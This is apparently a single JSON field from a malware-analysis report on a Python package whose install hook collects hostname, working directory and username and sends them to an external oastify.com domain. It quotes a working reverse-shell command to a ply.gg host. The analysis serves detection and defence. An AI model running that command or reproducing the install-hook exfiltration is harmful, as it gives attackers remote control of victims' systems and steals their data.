      "malicious_behavior": "The code contains multiple indicators of malicious behavior. It defines a custom install class that runs during package installation, collecting sensitive system information (hostname, current working directory, username) and exfiltrating it to a hardcoded external domain (https://89fupaokyqudefajq1l890u4ovumic61.oastify.com). Additionally, it attempts to execute a reverse shell command (bash -i >& /dev/tcp/electronics-affiliate.gl.at.ply.gg/18666 0>&1) using subprocess.run, which would give an attacker remote control over the victim's system. These actions are performed without user consent or notification, and the use of installation hooks for such purposes is a hallmark of supply chain attacks."
